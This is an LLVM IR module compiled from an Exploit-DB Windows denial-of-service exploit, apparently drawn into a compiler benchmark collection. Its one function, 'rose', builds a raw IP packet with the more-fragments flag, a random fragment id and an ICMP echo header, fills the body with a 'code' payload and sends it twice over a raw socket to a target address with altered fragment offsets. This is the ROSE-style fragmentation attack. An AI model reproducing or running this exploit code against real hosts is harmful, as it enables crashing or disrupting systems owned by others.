; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_24635.c_rose.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_24635.c_rose.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { %struct.TYPE_4__ }
%struct.TYPE_4__ = type { i32 }
%struct.iphdr = type { i32, i32, i32, i32, i64, i8*, i32, i32, i8*, i8* }
%struct.igmphdr = type { i32 }
%struct.icmphdr = type { i32, %struct.TYPE_6__, i64, i32 }
%struct.TYPE_6__ = type { %struct.TYPE_5__ }
%struct.TYPE_5__ = type { i32, i32 }
%struct.utsname = type { i32 }
%struct.passwd = type { i32 }
%struct.sockaddr = type { i32 }

@IP_MF = common dso_local global i32 0, align 4
@ICMP_ECHO = common dso_local global i32 0, align 4
@code = common dso_local global i8* null, align 8
@AF_INET = common dso_local global i32 0, align 4
@SOCK_RAW = common dso_local global i32 0, align 4
@IPPROTO_RAW = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [16 x i8] c"error: socket()\00", align 1
@.str.1 = private unnamed_addr constant [16 x i8] c"error: sendto()\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @rose(%struct.sockaddr_in* %0, i64 %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca %struct.sockaddr_in*, align 8
  %5 = alloca i64, align 8
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca %struct.iphdr*, align 8
  %9 = alloca %struct.igmphdr*, align 8
  %10 = alloca %struct.icmphdr*, align 8
  %11 = alloca %struct.utsname*, align 8
  %12 = alloca %struct.passwd*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  store %struct.sockaddr_in* %0, %struct.sockaddr_in** %4, align 8
  store i64 %1, i64* %5, align 8
  store i32 1000, i32* %6, align 4
  %17 = call i32 (...) @random()
  %18 = srem i32 %17, 40000
  %19 = add nsw i32 %18, 500
  store i32 %19, i32* %16, align 4
  %20 = load i32, i32* %6, align 4
  %21 = call i64 @calloc(i32 1, i32 %20)
  %22 = inttoptr i64 %21 to i8*
  store i8* %22, i8** %7, align 8
  %23 = load i8*, i8** %7, align 8
  %24 = bitcast i8* %23 to %struct.iphdr*
  store %struct.iphdr* %24, %struct.iphdr** %8, align 8
  %25 = load i8*, i8** %7, align 8
  %26 = getelementptr inbounds i8, i8* %25, i64 56
  %27 = bitcast i8* %26 to %struct.icmphdr*
  store %struct.icmphdr* %27, %struct.icmphdr** %10, align 8
  %28 = load %struct.iphdr*, %struct.iphdr** %8, align 8
  %29 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %28, i32 0, i32 0
  store i32 4, i32* %29, align 8
  %30 = load %struct.iphdr*, %struct.iphdr** %8, align 8
  %31 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %30, i32 0, i32 1
  store i32 14, i32* %31, align 4
  %32 = load %struct.iphdr*, %struct.iphdr** %8, align 8
  %33 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %32, i32 0, i32 2
  store i32 255, i32* %33, align 8
  %34 = load i32, i32* %6, align 4
  %35 = call i8* @htons(i32 %34)
  %36 = load %struct.iphdr*, %struct.iphdr** %8, align 8
  %37 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %36, i32 0, i32 9
  store i8* %35, i8** %37, align 8
  %38 = load %struct.iphdr*, %struct.iphdr** %8, align 8
  %39 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %38, i32 0, i32 3
  store i32 1, i32* %39, align 4
  %40 = load i32, i32* %16, align 4
  %41 = call i8* @htons(i32 %40)
  %42 = load %struct.iphdr*, %struct.iphdr** %8, align 8
  %43 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %42, i32 0, i32 8
  store i8* %41, i8** %43, align 8
  %44 = load i32, i32* @IP_MF, align 4
  %45 = call i8* @htons(i32 %44)
  %46 = load %struct.iphdr*, %struct.iphdr** %8, align 8
  %47 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %46, i32 0, i32 5
  store i8* %45, i8** %47, align 8
  %48 = load i64, i64* %5, align 8
  %49 = load %struct.iphdr*, %struct.iphdr** %8, align 8
  %50 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %49, i32 0, i32 4
  store i64 %48, i64* %50, align 8
  %51 = load %struct.sockaddr_in*, %struct.sockaddr_in** %4, align 8
  %52 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %51, i32 0, i32 0
  %53 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %52, i32 0, i32 0
  %54 = load i32, i32* %53, align 4
  %55 = load %struct.iphdr*, %struct.iphdr** %8, align 8
  %56 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %55, i32 0, i32 7
  store i32 %54, i32* %56, align 4
  %57 = load %struct.iphdr*, %struct.iphdr** %8, align 8
  %58 = bitcast %struct.iphdr* %57 to i16*
  %59 = call i32 @in_cksum(i16* %58, i32 56)
  %60 = load %struct.iphdr*, %struct.iphdr** %8, align 8
  %61 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %60, i32 0, i32 6
  store i32 %59, i32* %61, align 8
  %62 = load i32, i32* @ICMP_ECHO, align 4
  %63 = load %struct.icmphdr*, %struct.icmphdr** %10, align 8
  %64 = getelementptr inbounds %struct.icmphdr, %struct.icmphdr* %63, i32 0, i32 3
  store i32 %62, i32* %64, align 8
  %65 = load %struct.icmphdr*, %struct.icmphdr** %10, align 8
  %66 = getelementptr inbounds %struct.icmphdr, %struct.icmphdr* %65, i32 0, i32 2
  store i64 0, i64* %66, align 8
  %67 = load %struct.icmphdr*, %struct.icmphdr** %10, align 8
  %68 = getelementptr inbounds %struct.icmphdr, %struct.icmphdr* %67, i32 0, i32 0
  store i32 1000, i32* %68, align 8
  %69 = call i32 (...) @random()
  %70 = srem i32 %69, 255
  %71 = load %struct.icmphdr*, %struct.icmphdr** %10, align 8
  %72 = getelementptr inbounds %struct.icmphdr, %struct.icmphdr* %71, i32 0, i32 1
  %73 = getelementptr inbounds %struct.TYPE_6__, %struct.TYPE_6__* %72, i32 0, i32 0
  %74 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %73, i32 0, i32 0
  store i32 %70, i32* %74, align 4
  %75 = call i32 (...) @random()
  %76 = srem i32 %75, 255
  %77 = load %struct.icmphdr*, %struct.icmphdr** %10, align 8
  %78 = getelementptr inbounds %struct.icmphdr, %struct.icmphdr* %77, i32 0, i32 1
  %79 = getelementptr inbounds %struct.TYPE_6__, %struct.TYPE_6__* %78, i32 0, i32 0
  %80 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %79, i32 0, i32 1
  store i32 %76, i32* %80, align 4
  store i32 89, i32* %13, align 4
  br label %81

81:                                               ; preds = %90, %2
  %82 = load i32, i32* %13, align 4
  %83 = load i32, i32* %6, align 4
  %84 = icmp slt i32 %82, %83
  br i1 %84, label %85, label %93

85:                                               ; preds = %81
  %86 = load i8*, i8** %7, align 8
  %87 = load i32, i32* %13, align 4
  %88 = sext i32 %87 to i64
  %89 = getelementptr inbounds i8, i8* %86, i64 %88
  store i8 0, i8* %89, align 1
  br label %90

90:                                               ; preds = %85
  %91 = load i32, i32* %13, align 4
  %92 = add nsw i32 %91, 1
  store i32 %92, i32* %13, align 4
  br label %81

93:                                               ; preds = %81
  store i32 0, i32* %15, align 4
  store i32 588, i32* %13, align 4
  br label %94

94:                                               ; preds = %110, %93
  %95 = load i32, i32* %13, align 4
  %96 = sext i32 %95 to i64
  %97 = icmp ult i64 %96, 944
  br i1 %97, label %98, label %113

98:                                               ; preds = %94
  %99 = load i8*, i8** @code, align 8
  %100 = load i32, i32* %15, align 4
  %101 = sext i32 %100 to i64
  %102 = getelementptr inbounds i8, i8* %99, i64 %101
  %103 = load i8, i8* %102, align 1
  %104 = load i8*, i8** %7, align 8
  %105 = load i32, i32* %13, align 4
  %106 = sext i32 %105 to i64
  %107 = getelementptr inbounds i8, i8* %104, i64 %106
  store i8 %103, i8* %107, align 1
  %108 = load i32, i32* %15, align 4
  %109 = add nsw i32 %108, 1
  store i32 %109, i32* %15, align 4
  br label %110

110:                                              ; preds = %98
  %111 = load i32, i32* %13, align 4
  %112 = add nsw i32 %111, 1
  store i32 %112, i32* %13, align 4
  br label %94

113:                                              ; preds = %94
  %114 = load i32, i32* @AF_INET, align 4
  %115 = load i32, i32* @SOCK_RAW, align 4
  %116 = load i32, i32* @IPPROTO_RAW, align 4
  %117 = call i32 @socket(i32 %114, i32 %115, i32 %116)
  store i32 %117, i32* %14, align 4
  %118 = icmp slt i32 %117, 0
  br i1 %118, label %119, label %121

119:                                              ; preds = %113
  %120 = call i32 @perror(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str, i64 0, i64 0))
  store i32 1, i32* %3, align 4
  br label %146

121:                                              ; preds = %113
  %122 = load i32, i32* %14, align 4
  %123 = load i8*, i8** %7, align 8
  %124 = load i32, i32* %6, align 4
  %125 = load %struct.sockaddr_in*, %struct.sockaddr_in** %4, align 8
  %126 = bitcast %struct.sockaddr_in* %125 to %struct.sockaddr*
  %127 = call i32 @sendto(i32 %122, i8* %123, i32 %124, i32 0, %struct.sockaddr* %126, i32 4)
  %128 = icmp eq i32 %127, -1
  br i1 %128, label %129, label %131

129:                                              ; preds = %121
  %130 = call i32 @perror(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.1, i64 0, i64 0))
  store i32 1, i32* %3, align 4
  br label %146

131:                                              ; preds = %121
  %132 = call i8* @htons(i32 8100)
  %133 = load %struct.iphdr*, %struct.iphdr** %8, align 8
  %134 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %133, i32 0, i32 5
  store i8* %132, i8** %134, align 8
  %135 = load i32, i32* %14, align 4
  %136 = load i8*, i8** %7, align 8
  %137 = load i32, i32* %6, align 4
  %138 = load %struct.sockaddr_in*, %struct.sockaddr_in** %4, align 8
  %139 = bitcast %struct.sockaddr_in* %138 to %struct.sockaddr*
  %140 = call i32 @sendto(i32 %135, i8* %136, i32 %137, i32 0, %struct.sockaddr* %139, i32 4)
  %141 = load i8*, i8** %7, align 8
  %142 = call i32 @free(i8* %141)
  %143 = load i32, i32* %14, align 4
  %144 = call i32 @close(i32 %143)
  %145 = call i32 @usleep(i32 1000)
  store i32 0, i32* %3, align 4
  br label %146

146:                                              ; preds = %131, %129, %119
  %147 = load i32, i32* %3, align 4
  ret i32 %147
}

declare dso_local i32 @random(...) #1

declare dso_local i64 @calloc(i32, i32) #1

declare dso_local i8* @htons(i32) #1

declare dso_local i32 @in_cksum(i16*, i32) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @perror(i8*) #1

declare dso_local i32 @sendto(i32, i8*, i32, i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @free(i8*) #1

declare dso_local i32 @close(i32) #1

declare dso_local i32 @usleep(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
